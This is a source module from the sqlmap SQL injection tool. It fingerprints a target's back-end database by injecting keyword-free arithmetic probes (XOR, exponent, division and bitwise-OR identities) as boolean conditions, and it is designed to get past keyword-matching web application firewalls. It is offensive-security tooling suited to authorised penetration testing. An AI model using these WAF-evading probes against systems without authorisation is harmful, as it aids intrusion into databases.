#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.request.inject import checkBooleanExpression

# Operator-dialect probes for a keyword-free back-end DBMS heuristic.
#
# Each probe is an arithmetic identity that holds only in the dialect(s) noted, using operator
# *semantics* alone - no SQL keywords, functions, quotes or schema names. It complements
# heuristicCheckDbms() (which uses (SELECT 'x')='x' string round-trips): the dialect probes carry
# no SELECT/quote, so they can narrow the back-end DBMS where those are dropped (e.g. a
# keyword-matching WAF/IPS, or when kb.droppingRequests has it skipped entirely).
#
# Each probe is evaluated through checkBooleanExpression(), i.e. as an appended boolean
# (... AND (<probe>)), which yields a clean true/false from the comparison oracle. (A value-position
# variant - replacing the value with id=2^0 etc. - was prototyped and rejected: those probes land on
# OTHER valid rows, which sqlmap's fuzzy page comparison conflates with the anchor row, producing
# false positives. See PROVE_DESIGN.md.)
#
# Truth table measured on a live OWASP-CRS platform across 11 engines (MySQL, MariaDB/TiDB,
# PostgreSQL, CockroachDB, Microsoft SQL Server, SQLite, Firebird, ClickHouse, H2, HSQLDB, Derby);
# only the zero-false-positive rules are kept (see _classify). With anchor value 2:
#
#   * 2^0=2  -> '^' is bitwise XOR (MySQL/MSSQL: 2^0=2) vs exponentiation (PostgreSQL: 2^0=1) vs
#              no such operator (SQLite/Oracle/... -> error, so false)
#   * 2^3=8  -> '^' is exponentiation (PostgreSQL/CockroachDB: 2^3=8) - false for XOR dialects
#              (2^3=1) and erroring dialects; a positive PostgreSQL-family marker. CAVEAT:
#              '^'=exponentiation is not strictly unique to PostgreSQL - MS Access/Jet and DuckDB
#              also use it (neither on the platform), so this can read as PostgreSQL there.
#   * 5/2=2  -> integer division (PostgreSQL/MSSQL/SQLite) vs real division (MySQL/Oracle: 2.5)
#   * 2|0=2  -> a bitwise OR operator exists (absent in Firebird/Oracle/ClickHouse/H2)
DIALECT_PROBES = (
    ("xor", "2^0=2"),
    ("pgpow", "2^3=8"),
    ("intdiv", "5/2=2"),
    ("bitor", "2|0=2"),
)

def _classify(signature):
    """
    Maps a measured (xor, pgpow, intdiv, bitor) operator-dialect signature to a back-end
    DBMS, or returns None when the signature does not *uniquely* identify a major DBMS (so
    detection proceeds unchanged - the heuristic never wrong-foots the scan).

    Rules below are the subset of the measured 11-engine truth table that maps with zero
    false positives. Engines whose operator profile is not distinctive enough (Oracle's
    all-false signature, which a minimal engine like ClickHouse/H2/Firebird/HSQLDB/Derby or
    a fully WAF-blocked channel also produces) deliberately fall through to None:

    >>> _classify((True, False, False, True))            # MySQL / MariaDB / TiDB
    'MySQL'
    >>> _classify((True, False, True, True))             # Microsoft SQL Server
    'Microsoft SQL Server'
    >>> _classify((False, True, True, True))             # PostgreSQL
    'PostgreSQL'
    >>> _classify((False, True, False, True))            # CockroachDB (pgwire) -> PostgreSQL family
    'PostgreSQL'
    >>> _classify((False, False, True, True))            # SQLite
    'SQLite'
    >>> _classify((False, False, True, False)) is None   # Firebird/HSQLDB/Derby/H2 -> no prior
    True
    >>> _classify((False, False, False, False)) is None  # all-false (Oracle/ClickHouse/blocked) -> no prior
    True
    """

    xor, pgpow, intdiv, bitor = signature

    if pgpow:                                               # '^' is exponentiation -> PostgreSQL family
        return DBMS.PGSQL
    if xor and intdiv:                                      # '^' is XOR AND integer division -> SQL Server
        return DBMS.MSSQL
    if xor and not intdiv:                                  # '^' is XOR AND real division -> MySQL family
        return DBMS.MYSQL
    if not xor and intdiv and bitor:                        # no '^', integer division, bitwise '|' -> SQLite
        return DBMS.SQLITE

    return None

def dialectCheckDbms(injection):
    """
    Keyword-free back-end DBMS heuristic via operator-dialect differentials, evaluated through the
    given (boolean-capable) injection. Complements heuristicCheckDbms() - which is skipped when the
    WAF/IPS is dropping requests and otherwise relies on SELECT/quote payloads - because every probe
    here is built from operator semantics alone. Returns the DBMS name or None; an ambiguous or
    WAF-blocked channel yields None, leaving the scan unchanged.
    """

    retVal = None

    if conf.skipHeuristics:
        return retVal

    pushValue(kb.injection)
    kb.injection = injection

    try:
        # channel sanity: a tautology must read TRUE and a contradiction FALSE, otherwise the
        # boolean oracle is unreliable and the all-false signature (Oracle-like) would be meaningless
        if checkBooleanExpression("2=2") and not checkBooleanExpression("2=3"):
            signature = tuple(bool(checkBooleanExpression(expr)) for _, expr in DIALECT_PROBES)
            retVal = _classify(signature)
    finally:
        kb.injection = popValue()

    if retVal and not Backend.getIdentifiedDbms():
        infoMsg = "heuristic (dialect) test shows that the back-end DBMS could be '%s'" % retVal
        logger.info(infoMsg)

    return retVal
